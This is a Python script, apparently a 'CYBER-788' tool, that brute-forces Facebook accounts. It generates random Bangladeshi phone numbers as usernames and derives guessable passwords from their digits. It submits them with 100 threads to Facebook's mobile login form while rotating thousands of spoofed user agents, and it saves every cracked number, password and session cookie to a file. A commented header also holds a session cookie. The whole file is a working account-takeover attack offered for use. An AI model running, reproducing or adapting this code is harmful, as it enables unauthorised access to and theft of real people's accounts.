import os
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
   
ugen=[]
useragent=[]
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
import random
iphone_models = [
    "iPhone 12 Pro Max",
    "iPhone 12 Pro",
    "iPhone 12",
    "iPhone 12 Mini",
    "iPhone SE (2nd generation)",
    "iPhone 11 Pro Max",
    "iPhone 11 Pro",
    "iPhone 11",
    "iPhone XS Max",
    "iPhone XS",
    "iPhone XR",
    "iPhone X",
    "iPhone 8 Plus",
    "iPhone 8",
    "iPhone 7 Plus",
    "iPhone 7",
    "iPhone SE",
    "iPhone 6s Plus",
    "iPhone 6s",
    "iPhone 6 Plus",
    "iPhone 6",
    "iPhone 5s",
    "iPhone 5c",
    "iPhone 5",
    "iPhone 4s",
    "iPhone 4",
    "iPhone 3GS",
    "iPhone 3G",
    "iPhone",
    "iPhone 11 Pro Max",
    "iPhone 11 Pro",
    "iPhone 11",
    "iPhone XS Max",
    "iPhone XS",
    "iPhone XR",
    "iPhone X",
    "iPhone 8 Plus",
    "iPhone 8",
    "iPhone 7 Plus",
    "iPhone 7",
    "iPhone SE",
    "iPhone 6s Plus",
    "iPhone 6s",
    "iPhone 6 Plus",
    "iPhone 6",
    "iPhone 5s",
    "iPhone 5c",
    "iPhone 5",
    "iPhone 4s",
    "iPhone 4",
    "iPhone 3GS",
    "iPhone 3G",
    "iPhone"]
def uaa():
    model = random.choices(iphone_models)[0]
    ios_version = f"{random.randint(10, 14)}.{random.randint(0, 9)}"
    safari_version = f"{random.randint(10, 14)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    user_agent = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/{safari_version} (KHTML, like Gecko) Version/{safari_version} Mobile/15E148 Safari/{safari_version}" 
    return user_agent
uaa = [uaa() for _ in range(50000)]
def uaa():
    and_vers = random.randint(4,13)
    and_mod = random.choice(android_models)
    app_uld = str(random.randint(111111,999999))+'.'+str(random.randint(111,999))
    and_id = str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    app_ver = str(random.randint(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randrange(99,999))+'.'+str(random.randint(99,999))+'.'+str(random.randint(99,999))
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]'
    return ua

for ua in range(500):
      a='Mozilla/5.0 (Linux; Android 10; JSN-L42)'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
      
for ua in range(1000):
      a='Mozilla/5.0 (Linux; Android 11; SM-N986B)'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36 OPR/65.1.3381.61266'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
      
for ua in range(2000):
      a='Mozilla/5.0 (Linux; Android 11; RMX3241 Build/RP1A.200720.011; wv)'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)

for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 3 Build/OPM4.171019.021.Y1; wv)'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/277.0.0.13.119;]'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)

for ua in range(5000):
    a='NokiaX7-05/8.02-02/2.05-02/2.0'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='(2(8(3Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/1.01.02.0'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
    
    
for ua in range(1000):
	
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; Android 6.0{str(rr(5,12))}; OPPO CPH1609 Build/MRA58K'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
	C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f'/4.0 Chrome/87.0.4280.86{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
	E = f'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
	F = f'{A}{C}{D}{E}'
	ugen.append(F)
for ua in range(5000):
	
	rc = random.choice
	rr = random.randint
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	A = f'Mozilla/5.0 (Linux; Android 10.0{str(rr(5,12))}; Samsung SM-A30 Ultra Build/LMY47I'
	B = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))} '
	C = f'{str(rr(5,12))}) AppleWebKit/537.36 (KHTML, like Gecko)'
	D = f'/Chrome/95.0.4638.74{str(rr(20,100))}.0.{str(rr(1111,9999))}.{str(rr(20,100))}'
	E = f'Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/339.0.0.10.100;]'
	F = f'{A}{C}{D}{E}'
	ugen.append(F)
os.system("clear")
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
logo=("""
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m══════════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m _______   _______ ___________     ___________  _____ \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;92m/  __ \ \ / / ___ \  ___| ___ \   |___  /  _  ||  _  |\033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m| /  \/\ V /| |_/ / |__ | |_/ /_____ / / \ V /  \ V / \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;92m| |     \ / | ___ \  __||    /______/ /  / _ \  / _ \ \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m| \__/\ | | | |_/ / |___| |\ \    ./ /  | |_| || |_| |\033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;92m \____/ \_/ \____/\____/\_| \_|   \_/   \_____/\_____/\033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]                                                      \033[1;31m[\033[1;32m+\033[1;31m] 
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m══════════════[𓆩CYBER𓆪 𓆩-788𓆪 𓆩TEAM𓆪]═════════════════\033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]    \033[1;31m[\033[1;32m€\033[1;31m]\33[1;32m CREATED BY\33[0;m   : \033[1;96mSABBIR HOSSEN RAFI🌸           \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]    \033[1;31m[\033[1;32mT\033[1;31m]\33[1;32m BROTHER      : \033[1;35mTANVIR HOSSEN                  \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]    \033[1;31m[\033[1;32mA\033[1;31m]\33[1;32m FACEBOK      : \033[1;34mTanvir Hossen                  \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]    \033[1;31m[\033[1;32mN\033[1;31m]\33[1;32m GITHUB       : \033[1;35mHares-788-Cyber                \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]    \033[1;31m[\033[1;32mV\033[1;31m]\33[1;32m TOOL STATUS  : \033[1;36mRandom                         \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]    \033[1;31m[\033[1;32mI\033[1;31m]\33[1;32m TEAM         : \033[1;35mCYBER-788                      \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]    \033[1;31m[\033[1;32mR\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;36m2.2                            \033[1;31m[\033[1;32m+\033[1;31m]
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m══════════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def fuck():
    user=[]
    os.system('clear')
    time.sleep(0.8)
    print(logo)
    os.system('espeak -a 300 "What. is. your. name"')
    uname =input('\033[1;97m[\033[1;92m+\033[1;97m]\033[1;92m What is Your Name \033[1;91m: \33[1;32m')
    print('[+] SIM CODE BD=> 016-017-018-019')
    nude = input('\033[1;32m[\033[1;32m+\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    date = str(tgl)+'/'+str(bln)+'/'+str(thn)
    print('[+] 2000;5000;10000;15000;50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as turag:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;96m====================================================')
        print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
        os.system('espeak -a 1000 "Welcome"' +uname)
        print('\033[1;37m[\033[1;32m+\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m+\033[1;32m] TOTAL ID : '+tl)
        print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
        print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;93mSTART TIME :\033[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;96m====================================================')
        #print('\033[1;32m\n')
        
        
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud]
            turag.submit(rcrack,uid,pwx,tl)
            
    print(' [•] Crack process has been completed')
    print(' [•] Ids saved in ok.txt,cp.txt')
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;91m[\033[1;92mCYBER-788\033[1;91m][\033[1;92m%s\033[1;91m[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
         "method": 'GET',
         "scheme": 'https',
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=zQ1PZcpNcQQ1uc1OMJGpMR9Q; sb=dmlPZeByt9UlFVItICEX9yTl; zsh=ASRYy39CtrCXbtyGQakr0155cCvNVPQvcpmXFQH15-aDv6jNxIEMi-k3xgU8YungUmhRjJHKfMm4wOhbtuVBtIadmkJSOYzQOHVZ9R2aqw-IKV3x7QtokYHgk_ELC5KsZ4sdOTVL7K5uym--67C9DWfhOMRF_Ofdom2n_Y-JiFl4iyYJqJJVZ-SXqmy-rYoGO0KmBNwMmgzAGslcCVs3gofQyZgx1tCINjukCE9bo9V33kVDid-GkN0C5LCMTZl2ond-CHkdrNER7AfOtF_vCswvzTJR7uLjCo56gceZ0xcEgk1ctS4AcJXQM0SxsyYo1OU_aCtkl1RFkfUAtZy4crAUIA; wd=360x728; fr=0zhX14JrUWGTMxgKN..BlTw3N.LG.AAA.0.0.BlT2n3.AWXJiX2nlyA',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X6816C"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'viewport-width': '980',
    'user-agent': pro,}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m ')
                print('\033[38;5;46m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
                print("\033[1;92m┃\033[1;93m┏┳┓┏┓┳┓┓┏┳┳┓\033[1;92m                    ┗┓")
                print("\033[1;92m┃ ┃ ┣┫┃┃┃┃┃┣┫                     █")
                print("\033[1;92m┃\033[1;93m ┻ ┛┗┛┗┗┛┻┛┗\033[1;92m                     █")
                print('\033[38;5;46m┃ ┏━[CONGRATULATIONS FOR OK ID]   █')
                print('\033[38;5;46m┃ ┣━[Number] : '+uid+'\033[1;92m        █  ')
                print('\033[38;5;46m┃ ┗━[Password] : '+ps+'\033[1;92m          ┏┛')
                print('\033[38;5;46m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛') 
                print('\033[38;5;46m  [Cookies] : \033[1;93m'+coki+'\033[1;97m')    
                os.system('espeak -a 300 "Congratulations. ok id"')                                   
                open('/sdcard/CYBER-OK 👄💝.txt', 'a').write( uid+' | '+ps+'\n'+coki+'\n')
                oks.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()